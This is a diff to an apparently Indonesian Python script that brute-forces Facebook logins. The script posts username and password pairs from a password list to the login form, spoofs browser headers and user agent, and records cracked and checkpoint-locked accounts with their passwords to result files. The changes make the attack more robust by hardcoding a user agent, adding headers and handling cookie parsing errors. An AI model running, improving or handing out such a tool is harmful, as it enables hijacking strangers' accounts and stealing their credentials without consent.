@@ -1,13 +1,12 @@
 # hallo bro :v
 
-#from wibu.YNTKTS import *
 from modul import *
-from .useragent import uwa
 from .list_pass import pw_list
 import concurrent.futures
 import urllib.request
 
 ok,cp,cout,live,chek=0,0,0,[],[]
+useragent="Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7"
 
 class crack:
 	def __init__(self,url,user):
@@ -75,7 +74,7 @@ class crack:
 				del awok["sign_up"]
 				del awok["_fb_noscript"]
 			awok.update({"email":username,"pass":password})
-			ses.headers.update({"Host":self.url.split("//")[1],"upgrade-insecure-requests":"1","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","user-agent":uwa})
+			ses.headers.update({"Host":self.url.split("//")[1],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","origin":self.url,"user-agent":useragent,"referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			action=parser(respon,"html.parser").find("form",{"method":"post"})["action"]
 			try: ses.post(self.url+action,data=awok,allow_redirects=False)
 			except koneksi_error: self.facebook(username,list_password)
@@ -87,7 +86,8 @@ class crack:
 				break
 			elif "checkpoint" in cookie:
 				cp+=1
-				uid=json.loads(urllib.request.unquote(cookie["checkpoint"]))["u"]
+				try: uid=json.loads(urllib.request.unquote(cookie["checkpoint"]))["u"]
+				except: uid=username
 				self.save(f" \x1b[1;33m*--> {uid}|{password}","result/chek.txt",chek)
 				break
 			else: continue
